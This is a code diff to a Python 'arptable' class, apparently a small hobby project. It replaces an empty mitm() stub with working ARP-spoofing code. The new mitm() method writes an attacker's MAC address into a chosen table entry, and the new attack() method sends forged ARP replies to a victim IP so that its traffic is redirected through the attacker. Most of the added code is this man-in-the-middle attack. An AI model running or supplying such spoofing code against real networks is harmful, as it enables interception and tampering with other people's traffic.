@@ -10,6 +10,8 @@ class arptable:
 
         self.ip = ip
         self.table = table
+        self.mac = self.get_mac(ip)
+        
 
 
 
@@ -24,7 +26,7 @@ class arptable:
 
     def show(self):
             
-        print(self.ip + " ARP TABLE:\n")
+        print("\n\n" + self.ip + " ARP TABLE:\n")
         print("\t|\t\tIP\t|\t\tMAC\t\t|")
 
         for n, host in enumerate(self.table):
@@ -57,9 +59,38 @@ class arptable:
 
 
 
-    def mitm(self):
-        pass
 
+
+    def mitm(self, arpip):
+
+        attacker_mac = self.get_mac("192.168.100.2") 
+
+        row = 0
+        for n, r in enumerate(self.table):
+            if arpip == r[0]:
+                row = n
+                
+        
+
+        self.table[row][1] = attacker_mac
+        self.table[row][2] = True
+
+
+
+
+    def attack(self):
+
+        for r in self.table:
+            if r[2]:
+
+                spoof_ip = r[0]
+                spoof_mac = r[1]
+                
+                packet = ARP(op = 2, pdst = self.ip, hwdst = self.mac, hwsrc = spoof_mac, psrc = spoof_ip)
+
+                send(packet, verbose=False)
+
+                print("\nsent to {}: {} is at {}".format(self.ip, spoof_ip, spoof_mac))
     
 
         
